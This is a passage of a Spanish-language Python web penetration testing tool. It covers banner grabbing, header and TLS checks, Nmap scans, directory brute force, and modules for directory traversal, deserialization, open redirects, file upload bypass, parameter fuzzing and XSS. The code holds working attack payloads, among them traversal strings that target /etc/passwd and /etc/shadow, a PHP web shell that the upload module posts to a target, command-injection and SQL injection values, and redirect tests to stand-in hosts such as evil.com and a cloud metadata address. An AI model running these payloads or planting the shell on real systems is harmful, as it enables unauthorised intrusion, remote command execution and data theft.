                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                if banner:
                    print(f"\n{Colors.GREEN}✓{Colors.END} {tecnica['nombre']} ({tecnica['puerto']}):")
                    lines = banner.split('\n')
                    for i, line in enumerate(lines[:5]):  # Mostrar primeras 5 líneas
                        if line.strip():
                            print(f"     {line[:100]}")
                else:
                    print(f"  {Colors.YELLOW}?{Colors.END} {tecnica['nombre']} ({tecnica['puerto']}): Sin respuesta")
            else:
                print(f"  {Colors.RED}✗{Colors.END} {tecnica['nombre']} ({tecnica['puerto']}): Cerrado")
                
        except socket.timeout:
            print(f"  {Colors.YELLOW}?{Colors.END} {tecnica['nombre']} ({tecnica['puerto']}): Timeout")
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} {tecnica['nombre']} ({tecnica['puerto']}): Error - {str(e)[:30]}")
    
    # También probar con requests para HTTP/HTTPS
    print(f"\n{Colors.CYAN}[+] Headers HTTP/HTTPS via requests:{Colors.END}")
    try:
        respuesta = requests.get(f"http://{dominio}", timeout=5, verify=False)
        print(f"  {Colors.GREEN}✓{Colors.END} HTTP Headers:")
        for header, valor in respuesta.headers.items():
            if header.lower() in ['server', 'x-powered-by', 'x-aspnet-version']:
                print(f"     {Colors.YELLOW}{header}: {valor}{Colors.END}")
            else:
                print(f"     {header}: {valor}")
    except:
        try:
            respuesta = requests.get(f"https://{dominio}", timeout=5, verify=False)
            print(f"  {Colors.GREEN}✓{Colors.END} HTTPS Headers:")
            for header, valor in respuesta.headers.items():
                if header.lower() in ['server', 'x-powered-by', 'x-aspnet-version']:
                    print(f"     {Colors.YELLOW}{header}: {valor}{Colors.END}")
                else:
                    print(f"     {header}: {valor}")
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} Error obteniendo headers: {e}")

def escaneo_vulnerabilidades(objetivo):
    """Escaneo básico de vulnerabilidades"""
    print(f"\n{Colors.GREEN}[*] Escaneo básico de vulnerabilidades...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    # Checkeos comunes de vulnerabilidades
    vulnerabilidades = []
    
    print(f"{Colors.CYAN}[+] Realizando chequeos básicos...{Colors.END}")
    
    # 1. Check HTTP Security Headers
    try:
        respuesta = requests.get(f"https://{dominio}", timeout=5, verify=False)
        headers = respuesta.headers
        
        security_headers = {
            'X-Frame-Options': 'Protección contra clickjacking',
            'Content-Security-Policy': 'Política de seguridad de contenido',
            'Strict-Transport-Security': 'Forzar HTTPS',
            'X-Content-Type-Options': 'Prevenir MIME sniffing',
            'X-XSS-Protection': 'Protección XSS',
            'Referrer-Policy': 'Control de referrer',
        }
        
        print(f"\n{Colors.YELLOW}[+] Headers de seguridad:{Colors.END}")
        for header, desc in security_headers.items():
            if header in headers:
                print(f"  {Colors.GREEN}✓{Colors.END} {header}: Presente")
            else:
                print(f"  {Colors.RED}✗{Colors.END} {header}: Ausente - {desc}")
                vulnerabilidades.append(f"Falta header de seguridad: {header}")
                
    except Exception as e:
        print(f"  {Colors.RED}✗{Colors.END} Error chequeando headers: {e}")
    
    # 2. Check SSL/TLS (versión básica)
    print(f"\n{Colors.YELLOW}[+] Chequeo SSL/TLS básico:{Colors.END}")
    try:
        context = ssl.create_default_context()
        with socket.create_connection((dominio, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=dominio) as ssock:
                cert = ssock.getpeercert()
                
                # Check certificado expirado
                from datetime import datetime
                expira_str = cert['notAfter']
                expira = datetime.strptime(expira_str, '%b %d %H:%M:%S %Y %Z')
                hoy = datetime.utcnow()
                
                if hoy > expira:
                    print(f"  {Colors.RED}⚠{Colors.END} Certificado EXPIRADO: {expira_str}")
                    vulnerabilidades.append("Certificado SSL expirado")
                else:
                    print(f"  {Colors.GREEN}✓{Colors.END} Certificado válido hasta: {expira_str}")
                    
    except Exception as e:
        print(f"  {Colors.RED}✗{Colors.END} Error SSL/TLS: {e}")
        vulnerabilidades.append("Error en configuración SSL/TLS")
    
    # 3. Check archivos sensibles
    print(f"\n{Colors.YELLOW}[+] Buscando archivos sensibles:{Colors.END}")
    archivos_sensibles = [
        "/robots.txt",
        "/sitemap.xml", 
        "/.git/HEAD",
        "/.env",
        "/config.php",
        "/phpinfo.php",
        "/test.php",
        "/admin.php",
        "/backup.zip",
        "/dump.sql",
    ]
    
    for archivo in archivos_sensibles:
        try:
            url = f"https://{dominio}{archivo}"
            respuesta = requests.get(url, timeout=3, verify=False)
            if respuesta.status_code == 200:
                print(f"  {Colors.RED}⚠{Colors.END} {archivo} ACCESIBLE ({len(respuesta.text)} bytes)")
                vulnerabilidades.append(f"Archivo sensible accesible: {archivo}")
            else:
                print(f"  {Colors.GREEN}✓{Colors.END} {archivo}: {respuesta.status_code}")
        except:
            print(f"  {Colors.GREEN}✓{Colors.END} {archivo}: No accesible")
    
    # 4. Resumen
    print(f"\n{Colors.GREEN}[+] Escaneo completado{Colors.END}")
    if vulnerabilidades:
        print(f"{Colors.RED}[!] {len(vulnerabilidades)} vulnerabilidades potenciales encontradas:{Colors.END}")
        for vuln in vulnerabilidades:
            print(f"  • {vuln}")
    else:
        print(f"{Colors.GREEN}[+] No se encontraron vulnerabilidades obvias{Colors.END}")

def fuzzing_directorios(objetivo):
    """Fuzzing de directorios"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.GREEN}[*] Fuzzing de directorios...{Colors.END}")
    
    # Esta función ya está implementada como brute_force_directorios
    # Podemos llamar a esa función o implementar una versión específica
    
    print(f"{Colors.CYAN}[+] Esta función es similar a 'Fuerza Bruta de Directorios'{Colors.END}")
    print(f"{Colors.CYAN}[+] Usando brute_force_directorios...{Colors.END}")
    
    brute_force_directorios(objetivo)

def escaneo_nmap_integrado(objetivo):
    """Integración con Nmap"""
    print(f"\n{Colors.GREEN}[*] Escaneo con Nmap integrado...{Colors.END}")
    
    dominio = urlparse(objetivo).netloc
    
    print(f"{Colors.CYAN}[+] Verificando si Nmap está instalado...{Colors.END}")
    
    try:
        # Verificar si nmap está instalado
        resultado = subprocess.run(['which', 'nmap'], capture_output=True, text=True)
        
        if resultado.returncode != 0:
            print(f"  {Colors.RED}[!] Nmap no está instalado{Colors.END}")
            print(f"{Colors.YELLOW}[!] Instalar Nmap:{Colors.END}")
            print(f"  • Ubuntu/Debian: sudo apt install nmap")
            print(f"  • CentOS/RHEL: sudo yum install nmap")
            print(f"  • macOS: brew install nmap")
            return
        
        print(f"  {Colors.GREEN}✓{Colors.END} Nmap encontrado: {resultado.stdout.strip()}")
        
        # Opciones de escaneo
        print(f"\n{Colors.CYAN}[+] Selecciona tipo de escaneo Nmap:{Colors.END}")
        print(f"  1. Escaneo rápido (puertos comunes)")
        print(f"  2. Escaneo completo (todos los puertos)")
        print(f"  3. Detección de servicios y versiones")
        print(f"  4. Scripts de vulnerabilidad NSE")
        print(f"  5. Escaneo personalizado")
        
        try:
            opcion = int(input(f"{Colors.YELLOW}[?] Opción (1-5): {Colors.END}"))
            
            comandos = {
                1: f"nmap -F {dominio}",
                2: f"nmap -p- {dominio}",
                3: f"nmap -sV {dominio}",
                4: f"nmap -sC -sV {dominio}",
                5: ""
            }
            
            if opcion == 5:
                comando_personalizado = input(f"{Colors.CYAN}[?] Comando Nmap personalizado: {Colors.END}")
                comando = f"nmap {comando_personalizado} {dominio}"
            else:
                comando = comandos[opcion]
            
            print(f"\n{Colors.YELLOW}[+] Ejecutando: {comando}{Colors.END}")
            print(f"{Colors.CYAN}[+] Esto puede tomar varios minutos...{Colors.END}")
            
            # Ejecutar nmap
            resultado = subprocess.run(comando.split(), capture_output=True, text=True, timeout=300)
            
            if resultado.returncode == 0:
                print(f"\n{Colors.GREEN}[+] Resultados Nmap:{Colors.END}")
                
                # Parsear salida de nmap
                lineas = resultado.stdout.split('\n')
                
                # Mostrar información relevante
                for linea in lineas:
                    if 'PORT' in linea and 'STATE' in linea and 'SERVICE' in linea:
                        print(f"\n{Colors.CYAN}{linea}{Colors.END}")
                    elif 'open' in linea.lower() and 'tcp' in linea.lower():
                        partes = linea.split()
                        if len(partes) >= 3:
                            puerto = partes[0]
                            estado = partes[1]
                            servicio = partes[2]
                            print(f"  {Colors.GREEN}✓{Colors.END} {puerto} {estado} {servicio}")
                            if len(partes) > 3:
                                print(f"     {' '.join(partes[3:])}")
                    elif 'Nmap done' in linea:
                        print(f"\n{Colors.GREEN}{linea}{Colors.END}")
                    elif 'Host is up' in linea:
                        print(f"  {linea}")
                
                # Guardar resultados
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                archivo = f"nmap_scan_{dominio}_{timestamp}.txt"
                with open(archivo, 'w') as f:
                    f.write(resultado.stdout)
                print(f"\n{Colors.CYAN}[+] Resultados guardados en: {archivo}{Colors.END}")
                
            else:
                print(f"{Colors.RED}[!] Error ejecutando Nmap:{Colors.END}")
                print(resultado.stderr)
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[!] Nmap timeout - escaneo muy largo{Colors.END}")
            
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.END}")



# ============================
# MÓDULO 3: VULNERABILIDADES WEB
# ============================

def menu_vulnerabilidades_completas(objetivo):
    """Menú completo de pruebas de vulnerabilidad"""
    while True:
        print(f"\n{Colors.PURPLE}{Colors.BOLD}╔═════════ VULNERABILIDADES WEB ═════════╗{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}1.{Colors.END} Directory Traversal Profundo        {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}2.{Colors.END} Local File Inclusion (LFI) Completo {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}3.{Colors.END} Cross-Site Scripting (XSS) Completo {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}4.{Colors.END} Server-Side Request Forgery (SSRF)  {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}5.{Colors.END} Information Disclosure              {Colors.PURPLE}{Colors.BOLD}║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}6.{Colors.END} Command Injection                  {Colors.PURPLE}{Colors.BOLD} ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}7.{Colors.END} XML External Entity (XXE)          {Colors.PURPLE}{Colors.BOLD} ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}8.{Colors.END} Insecure Deserialization           {Colors.PURPLE}{Colors.BOLD} ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}9.{Colors.END} Open Redirects                     {Colors.PURPLE}{Colors.BOLD} ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}10.{Colors.END} File Upload Bypass                {Colors.PURPLE}{Colors.BOLD} ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}║{Colors.END} {Colors.CYAN}0.{Colors.END} Volver al Menú Principal           {Colors.PURPLE}{Colors.BOLD} ║{Colors.END}")
        print(f"{Colors.PURPLE}{Colors.BOLD}╚════════════════════════════════════════╝{Colors.END}")
        
        try:
            opcion = int(input(f"\n{Colors.YELLOW}[?] Selecciona opción: {Colors.END}"))
            
            if opcion == 0:
                break
            elif opcion == 1:
                directory_traversal_profundo(objetivo)
            elif opcion == 2:
                lfi_completo(objetivo)
            elif opcion == 3:
                xss_completo(objetivo)
            elif opcion == 4:
                ssrf_completo(objetivo)
            elif opcion == 5:
                info_disclosure_completo(objetivo)
            elif opcion == 6:
                command_injection(objetivo)
            elif opcion == 7:
                xxe_attack(objetivo)
            elif opcion == 8:
                insecure_deserialization(objetivo)
            elif opcion == 9:
                open_redirects(objetivo)
            elif opcion == 10:
                file_upload_bypass(objetivo)
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.END}")
                
        except ValueError:
            print(f"{Colors.RED}[!] Opción inválida{Colors.END}")


# ============================
# FUNCIONES PARA MENÚ DE VULNERABILIDADES WEB COMPLETAS
# ============================

def directory_traversal_profundo(objetivo):
    """Directory traversal profundo con múltiples técnicas"""
    print(f"\n{Colors.GREEN}[*] Directory Traversal profundo...{Colors.END}")
    
    # Pedir parámetro vulnerable
    parametro = input(f"{Colors.CYAN}[?] Parámetro vulnerable (ej: 'file', 'page'): {Colors.END}").strip() or "file"
    valor = input(f"{Colors.CYAN}[?] Valor normal (ej: 'index.php'): {Colors.END}").strip() or "index.php"
    
    payloads = [
        # Basic traversals
        f"{valor}",
        f"../../../{valor}",
        f"../../../../{valor}",
        f"../../../../../{valor}",
        f"../../../../../../{valor}",
        
        # Encoded
        f"..%2f..%2f..%2f{valor}",
        f"..%252f..%252f..%252f{valor}",
        f"%2e%2e/%2e%2e/%2e%2e/{valor}",
        
        # Double encoded
        f"..%255c..%255c..%255c{valor}",
        f"%252e%252e%252f%252e%252e%252f%252e%252e%252f{valor}",
        
        # Unicode
        f"..%c0%af..%c0%af..%c0%af{valor}",
        f"..%c1%9c..%c1%9c..%c1%9c{valor}",
        
        # Windows style
        f"..\\..\\..\\{valor}",
        f"..%5c..%5c..%5c{valor}",
        f"..%255c..%255c..%255c{valor}",
        
        # Bypass filters
        f"....//....//....//{valor}",
        f"../////..////{valor}",
        f".../...//{valor}",
        f"././{valor}",
        
        # Null byte
        f"../../../etc/passwd%00{valor}",
        f"../../../etc/passwd%00.jpg",
        
        # Path truncation
        f"../../../etc/passwd{'.' * 250}",
        f"../../../etc/passwd{'?' * 250}",
    ]
    
    archivos_sensibles = [
        "/etc/passwd",
        "/etc/shadow", 
        "/etc/hosts",
        "/etc/group",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "/proc/mounts",
        f"/var/www/html/{valor}",
        f"/home/{valor}",
        "/windows/win.ini",
        "/windows/system32/drivers/etc/hosts",
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(payloads)} payloads...{Colors.END}")
    
    vulnerables = []
    
    for i, payload in enumerate(payloads, 1):
        try:
            url = f"{objetivo.rstrip('/')}/?{parametro}={quote(payload)}"
            respuesta = requests.get(url, verify=False, timeout=5)
            
            contenido = respuesta.text.lower()
            
            # Detectar éxito
            indicadores = ['root:', 'daemon:', 'bin/', 'nobody:', '<?php', 'windows', 'system32']
            
            if any(ind in contenido for ind in indicadores):
                vulnerables.append(payload)
                print(f"  {Colors.GREEN}✓{Colors.END} Payload {i}: VULNERABLE ({respuesta.status_code})")
                
                # Extraer snippet de información
                lines = contenido.split('\n')
                for line in lines[:3]:
                    if any(ind in line for ind in indicadores):
                        print(f"     Data: {line[:100]}...")
                        break
            else:
                if respuesta.status_code != 404 and respuesta.status_code != 403:
                    print(f"  {Colors.YELLOW}?{Colors.END} Payload {i}: {respuesta.status_code} ({len(respuesta.text)} bytes)")
                else:
                    print(f"  {Colors.RED}✗{Colors.END} Payload {i}: {respuesta.status_code}")
                    
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} Payload {i}: Error - {str(e)[:30]}")
    
    if vulnerables:
        print(f"\n{Colors.GREEN}[+] ¡DIRECTORY TRAVERSAL ENCONTRADO!{Colors.END}")
        print(f"  {len(vulnerables)} payloads funcionaron")
        
        print(f"\n{Colors.YELLOW}[!] Siguiente paso:{Colors.END}")
        print(f"  {Colors.CYAN}1.{Colors.END} Intentar leer archivos sensibles:")
        for archivo in archivos_sensibles:
            print(f"     • {archivo}")
        print(f"  {Colors.CYAN}2.{Colors.END} Probar LFI a RCE:")
        print(f"     • Log poisoning")
        print(f"     • PHP wrappers")
        print(f"     • /proc/self/environ")
    else:
        print(f"\n{Colors.RED}[-] No se detectó Directory Traversal{Colors.END}")

def insecure_deserialization(objetivo):
    """Pruebas de deserialización insegura"""
    print(f"\n{Colors.GREEN}[*] Probando deserialización insegura...{Colors.END}")
    
    # Payloads para diferentes lenguajes
    payloads = {
        "PHP": {
            "serialized": 'O:8:"stdClass":0:{}',
            "unserialize": 'a:1:{s:4:"test";s:10:"malicious";}',
            "object": 'O:1:"A":1:{s:4:"exec";s:10:"phpinfo();";}',
        },
        "Java": {
            "base64": "rO0ABXQAVklmIHlvdSBzZWUgdGhpcywgdGhlIHN5c3RlbSBtYXkgYmUgdnVsbmVyYWJsZSB0byBKYXZhIGRlc2VyaWFsaXphdGlvbiE=",
        },
        "Python": {
            "pickle": b"\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04Test\x94\x93\x94\x8c\x04test\x94\x85\x94R\x94.",
        },
        ".NET": {
            "viewstate": "/wEPDwUKMTY1NDAyOTY0MWRk",
            "losformatter": "AAEAAAD/////AQAAAAAAAAAMAgAAAE5TeXN0ZW0uV2ViLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYQUBAAAAJVN5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuUGFnZS5WaWV3U3RhdGUBAAAAB1ZpZXdTdGF0ZQl0X1BhZ2VWYXIEAAAAAAEDAAA=",
        }
    }
    
    print(f"{Colors.CYAN}[+] Probando diferentes formatos de serialización...{Colors.END}")
    
    # Buscar parámetros comunes
    parametros = ['data', 'serialized', 'state', 'viewstate', 'session', 'token']
    
    for param in parametros:
        for lang, formatos in payloads.items():
            for tipo, payload in formatos.items():
                try:
                    if isinstance(payload, bytes):
                        payload_str = base64.b64encode(payload).decode()
                    else:
                        payload_str = payload
                    
                    # Probar GET
                    url = f"{objetivo}?{param}={quote(payload_str)}"
                    respuesta = requests.get(url, verify=False, timeout=5)
                    
                    # Probar POST
                    data = {param: payload_str}
                    respuesta_post = requests.post(objetivo, data=data, verify=False, timeout=5)
                    
                    # Buscar errores de deserialización
                    errores = ['unserialize', 'deserialize', 'serialization', 'pickle', 'viewstate']
                    
                    for resp in [respuesta, respuesta_post]:
                        if any(error in resp.text.lower() for error in errores):
                            print(f"  {Colors.GREEN}✓{Colors.END} Posible {lang} deserialización vulnerable")
                            print(f"     Parámetro: {param}, Tipo: {tipo}")
                            return
                            
                except Exception as e:
                    continue
    
    print(f"  {Colors.RED}[-] No se detectó deserialización insegura{Colors.END}")

def open_redirects(objetivo):
    """Pruebas de open redirects"""
    print(f"\n{Colors.GREEN}[*] Probando open redirects...{Colors.END}")
    
    parametro = input(f"{Colors.CYAN}[?] Parámetro de redirección (ej: 'redirect', 'url', 'next'): {Colors.END}").strip() or "redirect"
    
    # Lista de URLs de redirección
    redirect_urls = [
        "http://evil.com",
        "https://attacker.com",
        "//evil.com",
        "\\evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "/\\evil.com",
        "http://google.com@evil.com",
        "http://evil.com#@google.com",
        "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(redirect_urls)} URLs de redirección...{Colors.END}")
    
    vulnerables = []
    
    for url_redirect in redirect_urls:
        try:
            target_url = f"{objetivo.rstrip('/')}/?{parametro}={quote(url_redirect)}"
            respuesta = requests.get(target_url, verify=False, timeout=5, allow_redirects=False)
            
            # Verificar si hay redirección
            if respuesta.status_code in [301, 302, 303, 307, 308]:
                location = respuesta.headers.get('Location', '')
                
                if url_redirect in location or 'evil.com' in location or 'attacker.com' in location:
                    vulnerables.append(url_redirect)
                    print(f"  {Colors.GREEN}✓{Colors.END} Open redirect encontrado!")
                    print(f"     Redirige a: {location[:100]}")
                    break
                else:
                    print(f"  {Colors.YELLOW}?{Colors.END} Redirección pero no a URL controlada: {location[:50]}")
            else:
                print(f"  {Colors.RED}✗{Colors.END} No redirige: {respuesta.status_code}")
                
        except Exception as e:
            print(f"  {Colors.RED}✗{Colors.END} Error: {str(e)[:30]}")
    
    if vulnerables:
        print(f"\n{Colors.GREEN}[+] ¡OPEN REDIRECT VULNERABLE!{Colors.END}")
        print(f"\n{Colors.YELLOW}[!] Riesgos:{Colors.END}")
        print(f"  {Colors.CYAN}•{Colors.END} Phishing attacks")
        print(f"  {Colors.CYAN}•{Colors.END} Session stealing")
        print(f"  {Colors.CYAN}•{Colors.END} Malware distribution")
    else:
        print(f"\n{Colors.RED}[-] No se detectaron open redirects{Colors.END}")

def file_upload_bypass(objetivo):
    """Bypass de file upload restrictions"""
    print(f"\n{Colors.GREEN}[*] Probando bypass de file upload...{Colors.END}")
    
    print(f"{Colors.YELLOW}[!] Se necesita un endpoint de upload{Colors.END}")
    upload_url = input(f"{Colors.CYAN}[?] URL de upload (ej: /upload.php): {Colors.END}").strip()
    if not upload_url.startswith('/'):
        upload_url = '/' + upload_url
    
    # Tipos de archivo para bypass
    file_types = {
        "PHP Shell": {
            "content": b"<?php system($_GET['cmd']); ?>",
            "extensions": [".php", ".php3", ".php4", ".php5", ".phtml", ".phps"]
        },
        "JavaScript": {
            "content": b"<script>alert('XSS')</script>",
            "extensions": [".js", ".html", ".htm"]
        },
        "SVG with JS": {
            "content": b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>',
            "extensions": [".svg"]
        },
        "HTA": {
            "content": b'<script>alert("HTA")</script>',
            "extensions": [".hta"]
        }
    }
    
    print(f"{Colors.CYAN}[+] Técnicas de bypass:{Colors.END}")
    
    bypass_techniques = [
        "1. Extensión doble: shell.php.jpg",
        "2. Null byte: shell.php%00.jpg",
        "3. Case sensitive: shell.PhP",
        "4. Add magic bytes: GIF89a; <?php ... ?>",
        "5. Extra dots: shell...php",
        "6. Trailing spaces: shell.php ",
        "7. Semicolon: shell.php;.jpg",
        "8. Path traversal: ../../../shell.php",
    ]
    
    for tech in bypass_techniques:
        print(f"  {Colors.YELLOW}•{Colors.END} {tech}")
    
    # Probar algunas técnicas básicas
    print(f"\n{Colors.CYAN}[+] Probando upload básico...{Colors.END}")
    
    for file_name, file_info in file_types.items():
        for ext in file_info['extensions']:
            # Técnica: doble extensión
            bypass_name = f"shell{ext}.jpg"
            files = {'file': (bypass_name, file_info['content'], 'image/jpeg')}
            
            try:
                respuesta = requests.post(f"{objetivo}{upload_url}", files=files, verify=False, timeout=10)
                
                if respuesta.status_code == 200:
                    print(f"  {Colors.YELLOW}?{Colors.END} {file_name} con {ext}.jpg: {respuesta.status_code}")
                    if 'upload' in respuesta.text.lower() or 'success' in respuesta.text.lower():
                        print(f"     {Colors.GREEN}✓ Posible upload exitoso{Colors.END}")
                else:
                    print(f"  {Colors.RED}✗{Colors.END} {file_name} con {ext}.jpg: {respuesta.status_code}")
                    
            except Exception as e:
                print(f"  {Colors.RED}✗{Colors.END} Error: {str(e)[:30]}")
    
    print(f"\n{Colors.YELLOW}[!] Para pruebas completas:{Colors.END}")
    print(f"  {Colors.CYAN}•{Colors.END} Usar Burp Suite para manipular requests")
    print(f"  {Colors.CYAN}•{Colors.END} Probar cambiar Content-Type")
    print(f"  {Colors.CYAN}•{Colors.END} Manipular magic bytes")

def brute_force_directorios(objetivo):
    """Fuerza bruta de directorios y archivos"""
    if not disclaimer_intrusivo():
        return
    
    print(f"\n{Colors.GREEN}[*] Fuerza bruta de directorios...{Colors.END}")
    
    # Cargar wordlist o usar lista básica
    directorios = [
        # Common directories
        "admin", "administrator", "backend", "dashboard", "control", "manage",
        "phpmyadmin", "pma", "myadmin", "mysql", "sql", "database",
        "wp-admin", "wordpress", "joomla", "drupal",
        "cpanel", "whm", "webmail", "mail",
        "backup", "backups", "old", "temp", "tmp", "bak",
        "logs", "log", "error_log", "access_log",
        "uploads", "upload", "files", "images", "assets",
        "api", "rest", "graphql", "soap",
        "test", "testing", "dev", "development", "staging",
        "config", "configuration", "settings", "setup",
        "private", "secret", "hidden", "secure",
        
        # Common files
        "robots.txt", "sitemap.xml", "crossdomain.xml", "clientaccesspolicy.xml",
        ".htaccess", ".htpasswd", ".git/HEAD", ".svn/entries",
        "web.config", "php.ini", "config.php", "settings.py",
        "package.json", "composer.json", "Gemfile",
        "README.md", "CHANGELOG.txt", "LICENSE.txt",
        "backup.zip", "dump.sql", "database.sql",
        "admin.php", "login.php", "auth.php",
        "phpinfo.php", "test.php", "info.php",
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(directorios)} directorios/archivos...{Colors.END}")
    
    encontrados = []
    
    def probar_directorio(dir_path):
        url = f"{objetivo.rstrip('/')}/{dir_path}"
        try:
            respuesta = requests.get(url, verify=False, timeout=5)
            
            if respuesta.status_code == 200:
                tamaño = len(respuesta.text)
                return f"  {Colors.GREEN}✓{Colors.END} {url} - ENCONTRADO ({tamaño} bytes)"
            elif respuesta.status_code == 403:
                return f"  {Colors.YELLOW}?{Colors.END} {url} - PROHIBIDO (403)"
            elif respuesta.status_code == 301 or respuesta.status_code == 302:
                return f"  {Colors.YELLOW}?{Colors.END} {url} - REDIRECCIÓN ({respuesta.status_code})"
            else:
                return None
        except Exception:
            return None
    
    # Usar threading para acelerar
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        resultados = list(executor.map(probar_directorio, directorios))
    
    for resultado in resultados:
        if resultado:
            encontrados.append(resultado)
            print(resultado)
    
    if encontrados:
        print(f"\n{Colors.GREEN}[+] {len(encontrados)} recursos encontrados{Colors.END}")
        
        # Guardar resultados
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        archivo = f"directorios_{urlparse(objetivo).netloc}_{timestamp}.txt"
        with open(archivo, 'w') as f:
            for item in encontrados:
                f.write(item + '\n')
        print(f"{Colors.CYAN}[+] Resultados guardados en: {archivo}{Colors.END}")
    else:
        print(f"\n{Colors.RED}[-] No se encontraron directorios/archivos{Colors.END}")

def parameter_fuzzing(objetivo):
    """Fuzzing de parámetros"""
    print(f"\n{Colors.GREEN}[*] Fuzzing de parámetros...{Colors.END}")
    
    # Lista de parámetros comunes
    parametros = [
        "id", "page", "file", "view", "dir", "path", "folder",
        "url", "link", "src", "dest", "redirect", "return", "next",
        "cmd", "command", "exec", "ping", "host", "ip",
        "user", "username", "name", "email", "mail", "login",
        "pass", "password", "pwd", "key", "token", "auth",
        "search", "query", "q", "s", "find", "lookup",
        "order", "sort", "filter", "where", "limit", "offset",
        "debug", "test", "admin", "mode", "action", "do",
        "callback", "jsonp", "function", "method",
        "data", "input", "output", "result", "response",
    ]
    
    valores = [
        "test", "123", "admin", "true", "false", "null",
        "../../../etc/passwd", "<script>alert(1)</script>",
        "' OR '1'='1", "| ls -la", ";id",
        "${@phpinfo()}", "{{7*7}}",
    ]
    
    print(f"{Colors.CYAN}[+] Probando {len(parametros)} parámetros...{Colors.END}")
    
    respuestas_interesantes = []
    
    for param in parametros[:20]:  # Limitar a 20 para demo
        for valor in valores[:5]:  # Limitar a 5 valores
            try:
                # Probar GET
                url = f"{objetivo}?{param}={quote(valor)}"
                respuesta = requests.get(url, verify=False, timeout=5)
                
                # Buscar respuestas interesantes
                if respuesta.status_code != 404 and respuesta.status_code != 400:
                    contenido = respuesta.text.lower()
                    
                    # Indicadores de vulnerabilidad
                    indicadores = [
                        ('error', 'Posible error'),
                        ('warning', 'Posible warning'),
                        ('mysql', 'Error de MySQL'),
                        ('sql', 'Error de SQL'),
                        ('syntax', 'Error de sintaxis'),
                        ('undefined', 'Variable no definida'),
                        ('exception', 'Excepción'),
                    ]
                    
                    for indicador, mensaje in indicadores:
                        if indicador in contenido:
                            respuestas_interesantes.append((param, valor, mensaje))
                            print(f"  {Colors.YELLOW}?{Colors.END} {param}={valor[:20]}... - {mensaje}")
                            break
                
            except Exception as e:
                continue
    
    if respuestas_interesantes:
        print(f"\n{Colors.GREEN}[+] {len(respuestas_interesantes)} parámetros con respuestas interesantes{Colors.END}")
        print(f"\n{Colors.YELLOW}[!] Investigar estos parámetros:{Colors.END}")
        for param, valor, mensaje in respuestas_interesantes[:10]:  # Mostrar solo 10
            print(f"  {Colors.CYAN}•{Colors.END} {param} = {valor} ({mensaje})")
    else:
        print(f"\n{Colors.RED}[-] No se encontraron parámetros interesantes{Colors.END}")


def xss_completo(objetivo):
    """Pruebas completas de XSS"""
    print(f"\n{Colors.GREEN}[*] Ejecutando pruebas completas de XSS...{Colors.END}")
    
    # Obtener parámetros de la URL
    print(f"{Colors.YELLOW}[!] Se necesita un endpoint con parámetros para probar XSS{Colors.END}")
    
    endpoint = input(f"{Colors.CYAN}[?] Endpoint a probar (ej: /search?q=): {Colors.END}").strip()
    if not endpoint.startswith('/'):
        endpoint = '/' + endpoint
    
    # Payloads XSS avanzados
    payloads_xss = [
        # Basic payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        
        # Bypass filters
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<img src=x oneonerrorrror=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        
        # Encoded payloads
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
        
        # SVG payloads
        "<svg><script>alert('XSS')</script></svg>",
        "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
        
        # Event handlers
